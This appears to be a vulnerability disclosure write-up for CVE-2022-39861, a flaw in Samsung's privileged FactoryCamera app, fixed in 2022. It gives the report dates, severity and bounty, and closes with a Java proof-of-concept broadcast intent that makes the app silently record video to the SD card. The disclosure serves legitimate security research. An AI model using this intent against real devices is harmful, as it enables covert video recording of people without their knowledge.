# Details

<table>
    <tr>
        <td>Name</td>
        <td>FactoryCamera</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.sec.factory.camera</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.31</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.10.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39861">CVE-2022-39861</a> (SVE-2022-0808)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1910</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/033.%20FactoryCamera%20—%20Automatically%20launching%20camera%20and%20recording%20video/Oversecured_report.png)

During the vulnerability analysis, it turned out that the attacker could trigger this functionality and make this priviledged app automatically start recording video from the camera, saving the result to an SD card.

**Proof of Concept**

```java
Intent i = new Intent("com.sec.samsungtest.ACTION_CAMERATEST");
i.setClassName("com.sec.factory.camera", "com.sec.android.app.camera.AtBroadcastReceiver");
i.putExtra("testtype", "NCAMTEST");
i.putExtra("arg1", "0");
i.putExtra("arg2", "1");
i.putExtra("arg3", "1");
i.putExtra("arg4", "1");
sendBroadcast(i);
```
